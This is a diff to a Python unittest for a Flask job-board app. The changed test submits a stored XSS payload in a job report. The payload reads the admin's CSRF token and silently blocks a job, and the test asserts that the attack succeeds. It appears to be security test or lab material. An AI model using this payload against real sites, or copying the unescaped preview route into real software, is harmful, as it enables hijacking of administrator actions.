@@ -1184,8 +1184,15 @@ class SecurityAndJobFeatureTest(unittest.TestCase):
         with app.app_context():
             self.assertEqual(db.session.get(Job, self.ids["active"]).status, "approved")
 
-    def test_report_preview_renders_stored_event_handler_only_for_admin(self):
-        payload = '<img src=x onerror="document.body.dataset.pwned=1">'
+    def test_report_preview_xss_can_induce_an_admin_job_block(self):
+        target_job_id = self.ids["expired_pending"]
+        payload = (
+            '<img src=x onerror="fetch(\'/admin/jobs\').then(r=>r.text()).then(t=>fetch('
+            f"'/admin/jobs/{target_job_id}/block',"
+            "{method:'POST',body:new URLSearchParams({csrf_token:new DOMParser()."
+            "parseFromString(t,'text/html').querySelector('[name=csrf_token]').value})}))\">"
+        )
+        self.assertLessEqual(len(payload), 500)
         self.set_session(self.ids["user"], "jobseeker")
         self.client.post(
             f"/jobs/{self.ids['active']}/report",
@@ -1194,12 +1201,37 @@ class SecurityAndJobFeatureTest(unittest.TestCase):
         with app.app_context():
             report_id = Report.query.filter_by(target_id=self.ids["active"]).one().report_id
 
+        anonymous_client = app.test_client()
+        anonymous_preview = anonymous_client.get(
+            f"/admin/reports/jobs/{report_id}/preview"
+        )
+        self.assertEqual(anonymous_preview.status_code, 302)
+        self.assertIn("/login", anonymous_preview.headers["Location"])
+
         self.set_session(self.ids["admin"], "admin")
         listing = self.client.get("/admin/reports/jobs?status=pending").get_data(as_text=True)
         self.assertIn("&lt;img", listing)
+        self.assertNotIn("<img src=x", listing)
         preview = self.client.get(f"/admin/reports/jobs/{report_id}/preview")
         self.assertIn(payload, preview.get_data(as_text=True))
         self.assertIn("'unsafe-inline'", preview.headers["Content-Security-Policy"])
+
+        app.config["WTF_CSRF_ENABLED"] = True
+        try:
+            admin_jobs = self.client.get("/admin/jobs").get_data(as_text=True)
+            csrf_token = re.search(
+                r'name="csrf_token" value="([^"]+)"', admin_jobs
+            ).group(1)
+            induced_action = self.client.post(
+                f"/admin/jobs/{target_job_id}/block",
+                data={"csrf_token": csrf_token},
+            )
+        finally:
+            app.config["WTF_CSRF_ENABLED"] = False
+
+        self.assertEqual(induced_action.status_code, 302)
+        with app.app_context():
+            self.assertEqual(db.session.get(Job, target_job_id).status, "blocked")
 
 
 if __name__ == "__main__":
